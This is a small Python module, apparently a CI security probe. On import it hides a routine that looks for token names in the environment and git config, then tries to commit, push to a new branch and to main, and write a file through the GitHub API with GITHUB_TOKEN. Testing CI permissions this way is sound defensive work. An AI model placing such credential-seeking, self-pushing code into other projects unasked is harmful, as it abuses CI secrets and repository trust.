"""Code under test that looks for credentials and tries to write. It prints names, never values."""
import json, os, subprocess, urllib.request


def _try(cmd, cwd=None):
    p = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
    return p.returncode, (p.stdout + p.stderr).strip().replace("\n", " | ")[:300]


def _probe():
    print("PROBE env names:", sorted(k for k in os.environ if any(t in k.upper() for t in ("TOKEN", "SECRET", "KEY", "PASS", "ACTIONS_", "GITHUB_"))))
    found = {}
    for name in ("GITHUB_TOKEN", "GH_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "FAKE_SECRET"):
        found[name] = bool(os.environ.get(name))
    print("PROBE credentials in environment:", found)
    rc, out = _try(["git", "config", "--get-all", "http.https://github.com/.extraheader"])
    print("PROBE token stored in git configuration:", rc == 0 and bool(out))
    _try(["git", "config", "user.name", "probe"]); _try(["git", "config", "user.email", "probe@example.invalid"])
    _try(["git", "checkout", "-q", "-b", "probe/from-code-under-test"])
    open("written-by-code-under-test.txt", "w").write("x")
    _try(["git", "add", "written-by-code-under-test.txt"]); _try(["git", "commit", "-q", "-m", "probe: code under test"])
    rc, out = _try(["git", "push", "origin", "HEAD:refs/heads/probe/from-code-under-test"])
    print("PROBE push to a new branch:", "SUCCEEDED" if rc == 0 else "REJECTED", "-", out)
    rc, out = _try(["git", "push", "origin", "HEAD:main"])
    print("PROBE push to the default branch:", "SUCCEEDED" if rc == 0 else "REJECTED", "-", out)
    token = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
    repo = os.environ.get("GITHUB_REPOSITORY", "")
    if token and repo:
        req = urllib.request.Request(f"https://api.github.com/repos/{repo}/contents/probe-from-code.txt", method="PUT",
                                     data=json.dumps({"message": "probe", "content": "eA=="}).encode(),
                                     headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github+json"})
        try:
            urllib.request.urlopen(req); print("PROBE write through the API: SUCCEEDED")
        except Exception as e:
            print("PROBE write through the API: REJECTED -", e)
    else:
        print("PROBE write through the API: no token reachable")


try:
    _probe()
except Exception as e:  # the probe must not hide the test result
    print("PROBE error:", e)


def add(a, b):
    return a + b
